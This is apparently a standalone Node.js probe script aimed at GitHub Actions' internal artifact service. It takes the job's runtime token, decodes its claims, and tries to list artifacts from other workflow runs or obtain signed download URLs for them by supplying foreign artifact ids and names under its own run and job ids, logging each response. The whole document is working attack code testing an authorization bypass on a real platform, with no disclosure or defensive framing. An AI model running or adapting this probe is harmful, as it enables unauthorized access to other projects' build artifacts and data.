function decodeJwtPayload(token) {
  const parts = token.split('.');
  if (parts.length < 2) return null;
  let p = parts[1].replace(/-/g, '+').replace(/_/g, '/');
  while (p.length % 4) p += '=';
  try { return JSON.parse(Buffer.from(p, 'base64').toString('utf8')); }
  catch (e) { return null; }
}

async function twirp(base, token, method, body, extraHeaders = {}) {
  const res = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      'authorization': `Bearer ${token}`,
      'user-agent': 'actions-artifact-client/1.0',
      ...extraHeaders
    },
    body: JSON.stringify(body)
  });
  const text = await res.text();
  return { status: res.status, text: text.slice(0, 1500) };
}

async function main() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
  const resultsUrl = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');
  console.log(`token.len=${token.length}`);
  const claims = decodeJwtPayload(token);
  if (!claims) { console.log('CLAIMS=decode-failed'); return; }
  const plan = claims.plan_id, job = claims.job_id;
  console.log(`plan=${plan} job=${job}`);

  // P3a: ListArtifacts with own backend ids (correct proto field names)
  let r = await twirp(resultsUrl, token, 'ListArtifacts', {
    workflowRunBackendId: plan, workflowJobRunBackendId: job
  });
  console.log(`P3A_NOFILTER status=${r.status} body=${r.text.slice(0, 1200)}`);

  // P3b: ListArtifacts idFilter = foreign artifact id (public numeric id)
  const repo = process.env.GITHUB_REPOSITORY;
  const thisRun = process.env.GITHUB_RUN_ID;
  let foreignIds = [];
  try {
    const res = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts?per_page=20`);
    const data = await res.json();
    for (const a of (data.artifacts || [])) {
      const foreign = String(a.workflow_run.id) !== String(thisRun);
      if (foreign) foreignIds.push({ id: a.id, name: a.name, run: a.workflow_run.id });
    }
  } catch (e) { console.log('LIST_ERR=' + e.message); }

  for (const f of foreignIds.slice(0, 3)) {
    r = await twirp(resultsUrl, token, 'ListArtifacts', {
      workflowRunBackendId: plan, workflowJobRunBackendId: job,
      idFilter: String(f.id)
    });
    console.log(`P3B_IDFILTER foreign_id=${f.id} name=${f.name} status=${r.status} body=${r.text}`);
  }

  // P3c: GetSignedArtifactURL own name+own ids (positive control)
  r = await twirp(resultsUrl, token, 'GetSignedArtifactURL', {
    workflowRunBackendId: plan, workflowJobRunBackendId: job, name: 'own-pr-artifact'
  });
  console.log(`P3C_SIGNED_OWN status=${r.status} body=${r.text.slice(0, 400)}`);

  // P3d: GetSignedArtifactURL foreign name with own ids (name confusion test)
  if (foreignIds.length) {
    r = await twirp(resultsUrl, token, 'GetSignedArtifactURL', {
      workflowRunBackendId: plan, workflowJobRunBackendId: job, name: foreignIds[0].name
    });
    console.log(`P3D_SIGNED_NAMECONF status=${r.status} body=${r.text.slice(0, 400)}`);
  }
}

main().catch(e => { console.error('FATAL', e); process.exit(1); });
